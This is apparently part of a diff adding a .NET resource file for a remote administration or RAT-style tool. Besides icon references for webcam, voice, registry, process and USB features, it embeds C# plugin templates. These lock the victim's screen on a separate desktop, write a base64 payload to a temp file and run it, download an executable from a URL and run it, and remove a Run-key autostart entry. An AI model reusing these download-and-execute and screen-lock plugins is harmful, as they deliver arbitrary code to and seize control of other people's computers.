+  <data name="kill" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\kill.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="kill_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\kill_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="LockScreen_OFF" xml:space="preserve">
+    <value>using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            SwitchDesktop(GetThreadDesktop(Process.GetProcessesByName("explorer")[0].Threads[0].Id));
+            return new string[] { "Null", "" };
+        }
+
+        [DllImport("user32.dll")]
+        public static extern bool SwitchDesktop(IntPtr hDesktop);
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetThreadDesktop(int dwThreadId);
+
+    }
+}</value>
+  </data>
+  <data name="LockScreen_ON" xml:space="preserve">
+    <value>using System;
+using System.Runtime.InteropServices;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            SwitchDesktop(CreateDesktop("Lock", IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero));
+            return new string[] { "Null", "" };
+        }
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);
+
+        [DllImport("user32.dll")]
+        public static extern bool SwitchDesktop(IntPtr hDesktop);
+        enum DESKTOP_ACCESS : uint
+        {
+            DESKTOP_NONE = 0,
+            DESKTOP_READOBJECTS = 0x0001,
+            DESKTOP_CREATEWINDOW = 0x0002,
+            DESKTOP_CREATEMENU = 0x0004,
+            DESKTOP_HOOKCONTROL = 0x0008,
+            DESKTOP_JOURNALRECORD = 0x0010,
+            DESKTOP_JOURNALPLAYBACK = 0x0020,
+            DESKTOP_ENUMERATE = 0x0040,
+            DESKTOP_WRITEOBJECTS = 0x0080,
+            DESKTOP_SWITCHDESKTOP = 0x0100,
+
+            GENERIC_ALL = (DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
+                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
+                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
+        }
+    }
+}</value>
+  </data>
+  <data name="max" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\max.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="max_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\max_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Message_Box" xml:space="preserve">
+    <value>using System;
+using System.Windows.Forms;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            MessageBox.Show("%qwqdanchun%");
+            return new string[] { "Null", "" };
+        }
+    }
+}</value>
+  </data>
+  <data name="min" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\min.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="min_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\min_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="mouse" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\mouse.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="mouse_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\mouse_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="network" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\network.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="network_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\network_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="newfile" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\newfile.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="newfile_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\newfile_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="newfolder" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\newfolder.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="newfolder_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\newfolder_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="normal" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\normal.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="normal_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\normal_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="open" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\open.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="open_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\open_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="paste" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\paste.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="paste_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\paste_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="play" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\play.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="play_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\play_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="powershell" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\powershell.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="powershell_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\powershell_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="process" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\process.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="process_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\process_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="refresh" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\refresh.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="refreshprocess" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\refreshprocess.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="refreshprocess_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\refreshprocess_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="refresh_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\refresh_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="registry" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\registry.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="registry_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\registry_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="rename" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\rename.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="rename_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\rename_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="save" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\save.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="save_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\save_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="screen" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\screen.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="screen_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\screen_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="search" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\search.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="search_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\search_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Send_File_From_Disk" xml:space="preserve">
+    <value>using System;
+using System.Diagnostics;
+using System.IO;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            string path = Path.GetTempFileName() + "%Extension%";
+            File.WriteAllBytes(path, Convert.FromBase64String("%qwqdanchun%"));
+            Process.Start(path);
+            return new string[] { "Null", "" };
+        }
+    }
+}</value>
+  </data>
+  <data name="Send_File_From_URL" xml:space="preserve">
+    <value>using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            string tmppath;
+            using (WebClient client = new WebClient())
+            {
+                tmppath = Path.GetTempFileName() + ".exe";
+                client.DownloadFile(@"%qwqdanchun%", tmppath);
+            }
+            Process.Start(tmppath);
+            return new string[] { "Null", "" };
+        }
+    }
+}</value>
+  </data>
+  <data name="setting" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\setting.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="setting_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\setting_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="side" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\side.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="side_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\side_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="stop" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\stop.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="stop_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\stop_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="switch" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\switch.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="switch_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\switch_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="task" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\task.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="task_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\task_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Toggle_Off" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Toggle_Off.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Toggle_On" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Toggle_On.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Uninstall" xml:space="preserve">
+    <value>using System;
+using System.Diagnostics;
+using System.IO;
+using Microsoft.Win32;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", RegistryKeyPermissionCheck.ReadWriteSubTree))
+                {
+                    key.DeleteValue(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName));
+                }
+            }
+            catch { }
+
+            return new string[] { "Delete", "" };
+        }
+    }
+}</value>
+  </data>
+  <data name="upload" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\upload.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="upload_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\upload_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="USB" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\USB.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Visit_Website" xml:space="preserve">
+    <value>using System;
+using System.Diagnostics;
+
+namespace qwqdanchun
+{
+    public static class Program
+    {
+        public static string[] pluginMain(string[] args)
+        {
+            Process.Start(@"%qwqdanchun%");
+            return new string[] { "Null", "" };
+        }
+    }
+}</value>
+  </data>
+  <data name="voice" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\voice.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="voice_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\voice_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="webcam" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\webcam.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="webcam_dark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\webcam_dark.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="_7za" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\7za.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+</root>
